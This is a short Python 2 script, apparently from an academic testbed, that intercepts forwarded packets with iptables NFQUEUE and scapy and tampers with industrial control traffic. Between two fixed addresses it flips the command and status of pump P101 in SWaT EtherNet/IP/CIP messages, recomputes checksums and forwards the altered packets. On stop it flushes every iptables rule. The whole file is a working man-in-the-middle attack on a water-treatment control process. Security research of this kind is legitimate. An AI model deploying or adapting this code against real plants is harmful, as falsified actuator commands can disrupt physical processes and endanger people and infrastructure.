#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2017 Francisco Furtado, francisco_dos@sutd.edu.sg
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

from netfilterqueue import NetfilterQueue
import os, sys, argparse, struct, binascii
import datetime, ctypes, random
from time import sleep
from time import time as ts
from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP
from scapy.all import *
import cip,enip_tcp

def __extract(packet):

    pkt = IP(packet.get_payload())
       
    if (str(pkt.src) == '192.168.1.10' and str(pkt.dst) == '192.168.1.100' ):
        pkt.show()

        if pkt[SWAT_P1_ALL].P101_cmd == 1:
            pkt[SWAT_P1_ALL].P101_cmd = 2
            pkt[SWAT_P1_ALL].P101_status = 2
        else:
            pkt[SWAT_P1_ALL].P101_cmd = 1
            pkt[SWAT_P1_ALL].P101_status = 1

        del pkt[TCP].chksum  # Need to recompute checksum
        del pkt[IP].chksum
        pkt.show2()
        packet.set_payload(str(pkt))
            
         
    # then, let the netfilterqueue forward the packet   
    packet.accept()


        
def start():
    __setdown()
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, __extract)
   
    try:
        print("[*] starting NFQUEUE")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping NFQUEUE")
        nfqueue.unbind()  
    return 1

def __setup():
    os.system('iptables -A FORWARD -p tcp -m physdev --physdev-in enp0s8 -j NFQUEUE --queue-num 1')
    toggle_flag = False


def __setdown():
    sleep(1) # wait for one second before stopping the attack
    os.system('sudo iptables -F')


if __name__ == '__main__':
    start()
    